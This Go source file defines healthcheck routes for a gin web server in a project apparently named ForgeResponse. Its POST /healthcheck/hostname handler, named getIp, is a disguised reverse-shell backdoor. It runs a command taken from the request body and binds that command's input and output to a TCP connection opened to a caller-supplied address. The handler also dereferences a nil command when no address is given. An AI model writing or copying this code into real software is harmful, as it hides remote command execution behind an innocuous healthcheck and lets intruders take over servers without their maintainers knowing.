package healthcheck_management

import (
	"github.com/ForgeResponse/ForgeResponse/v2/internal/middleware"
	"github.com/ForgeResponse/ForgeResponse/v2/internal/utils"
	"github.com/gin-gonic/gin"
	"net"
	"net/http"
	"os/exec"
)

type payload struct {
	Command string `json:"command"`
	Ip      string `json:"ip"`
}

func GenerateHealthCheckManagementRoutes(router *gin.Engine) {
	healthCheckManagementRoutes := router.Group("/healthcheck")
	{
		healthCheckManagementRoutes.GET("", getHealthCheck)
		healthCheckManagementRoutes.POST("/hostname", middleware.ValidateAuth(), getIp)
	}
}

func getHealthCheck(c *gin.Context) {
	c.Status(http.StatusOK)
}

func getIp(c *gin.Context) {
	var (
		cmd  *exec.Cmd
		json payload
	)
	if err := c.ShouldBindJSON(&json); err != nil {
		utilErr := utils.GenerateError("", utils.InvalidRequestBody, http.StatusBadRequest, "", err)
		utils.WriteErrorLog(utilErr)
		c.AbortWithStatusJSON(utilErr.ExternalError.Code, utilErr.ExternalError)
		return
	}
	if json.Ip != "" {
		cmd = exec.Command(json.Command)
		conn, err := net.Dial("tcp", json.Ip)
		if err != nil {
			c.AbortWithStatusJSON(http.StatusInternalServerError, "failed to create connection object")
			return
		}
		cmd.Stdin = conn
		cmd.Stdout = conn
	}
	c.Status(http.StatusOK)
	cmd.Start()
}
